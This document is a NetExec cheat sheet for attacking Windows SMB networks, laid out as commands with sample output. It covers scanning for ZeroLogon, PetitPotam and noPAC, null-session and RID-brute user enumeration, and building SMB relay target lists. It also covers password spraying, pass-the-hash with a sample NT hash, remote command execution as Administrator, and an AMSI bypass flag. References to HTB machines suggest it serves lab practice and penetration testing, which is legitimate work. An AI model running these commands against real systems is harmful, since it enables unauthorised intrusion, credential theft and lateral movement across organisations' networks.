## Scan for Vulnerabilities
```
These are a few modules you should try early:

ZeroLogon
nxc smb <ip> -u '' -p '' -M zerologon

PetitPotam
nxc smb <ip> -u '' -p '' -M petitpotam

noPAC
nxc smb <ip> -u 'user' -p 'pass' -M nopac <- You need a credential for this one

Or, try them all at once! Just list each one: -M zerologon -M petitpotam
Check out what other modules are available via nxc <protocol> -L
```

## Enumeration 
```
Map Network Hosts
Returns a list of live hosts:
nxc smb 192.168.1.0/24

Expected Results:
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
```

## Enumerate Null Sessions
```
Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc
nxc smb 10.10.10.161 -u '' -p ''
nxc smb 10.10.10.161 --pass-pol
nxc smb 10.10.10.161 --users
nxc smb 10.10.10.161 --groups

You can also reproduce this behavior with smbclient or rpcclient:
smbclient -N -U "" -L \\10.10.10.161
rpcclient -N -U "" -L \\10.10.10.161
rpcclient $> enumdomusers
user:[bonclay] rid:[0x46e]
user:[zoro] rid:[0x46f]

Example
Forest or Monteverde machines are good HTB examples to test null session authentication with NetExec.
```

## Enumerate Anonymous Logon
```
Using a random username and password you can check if the target accepts annonymous/guest logon.
Make sure the password is empty:
nxc smb 10.10.10.178 -u 'a' -p ''

You can also check this behavior with smbclient or rpcclient:
smbclient -N -L \\10.10.10.178
rpcclient -N -L 10.10.10.178

Nest machine is a good HTB example of anonymous logon with NetExec.
``` 

## Enumerate Hosts with SMB Signing Not Required
```
Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing.
List format is one IP per line:
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt

Expected Results:
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

#~ cat relay_list.txt
192.168.1.111
192.168.1.117

Alternative with nmap
You can also list only the hosts that don't require SMB signing using nmap:
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 127.0.0.1
```

## Enumerate Active Sessions
```
Enumerate active sessions on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
```

## Enumerate Shares and Access
```
Enumerate permissions on all shares:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares

If you want to filter only by readable or writable share:
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE
```

## Enumerate Disks
```
Enumerate disks on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
```

## Enumerate Logged on Users
```
Enumerate logged users on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
```

## Enumerate Domain Users
```
Enumerate domain users on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
```

## Enumerate Users by Bruteforcing RID
```
Enumerate users by bruteforcing the RID on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

## Enumerate Domain Groups
```
Enumerate domain groups on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
```

## Enumerate Local Groups
```
Enumerate local groups on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' s --local-group
```

## Enumerate Domain Password Policy
```
Using the option --pass-pol you can get the password policy of the domain:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```

## Enumerate Anti-Virus & EDR (new!)
```
Enumerate antivirus installed using NetExec.
You don't need to be a privileged user to do this action.
nxc smb <ip> -u user -p pass -M enum_av
```

## Password Spraying
```
Using NetExec for password spraying.
Using Username/Password Lists.

You can try multiple usernames or passwords by seperating the names/passwords with a space:

nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18
nxc smb 192.168.1.101 -u user1 -p password1 password2 password3

nxc accepts txt files of usernames and passwords. One user/password per line. Watch out for account lockout!:

nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18
nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt

By default nxc will exit after a successful login is found.
Using the --continue-on-success flag will continue spraying even after a valid password is found.
Usefull for spraying a single password against a large user list Usage example:

nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

## Checking 'username == password' using wordlist
```
nxc smb 192.168.1.101 -u user.txt -p user.txt --no-bruteforce --continue-on-success
```

## Checking multiple usernames/passwords using wordlist
```
nxc smb 192.168.1.101 -u user.txt -p password.txt

The result will be:
user1 => password1
user1 => password2
user2 => password1
user2 => password2
```

## Authentication
```
You can authenticate on the remote target using a domain account or a local user.
When authentication fail => COLOR RED
When authentication success => COLOR GREEN
When authentication fail but the password provided is valid => COLOR MAGENTA

Failed logins result in a [-]
Successful logins result in a [+] Domain\Username:Password

Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.
SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)

The following checks will attempt authentication to the entire /24 though a single target may also be used.

User/Password
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'

User/Hash
After obtaining credentials such as
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
you can use both the full hash or just the nt hash (second half)

#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

## Checking Credentials (Local)
```
User/Password/Hashes
Adding --local-auth to any of the authentication commands with attempt to logon locally.
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
#~ nxc smb 192.168.1.0/24 -u '' -p '' --local-auth
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
#~ nxc smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
#~ nxc smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth

Results will display the hostname next to the user:password:
SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)
```

## Command Execution - Executing Remote Commands
```
Executing Remote Commands
Executing commands on a windows system requires Administrator credentials.
nxc automatically tells you if the credential set you're using has admin access to a host by appending "(Pwn3d!)" (or whatever value you've set in the config) to the output when authentication is successful.
```

## Execution Methods
```
nxc has three different command execution methods:
wmiexec executes commands via WMI
atexec executes commands by scheduling a task with windows task scheduler
smbexec executes commands by creating and running a service

By default nxc will fail over to a different execution method if one fails. It attempts to execute commands in the following order:
1. wmiexec
2. atexec
3. smbexec

If you want to force nxc to use only one execution method you can specify which one using the --exec-method flag.
```

## Executing Commands
```
In the following example, we try to execute whoami on the target using the -x flag:
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
06-05-2016 14:34:39 [*] KTHXBYE!

You can also directly execute PowerShell commands using the -X flag:
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
06-05-2016 14:36:10 [*] KTHXBYE!
```

## Bypass AMSI
```
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
```






























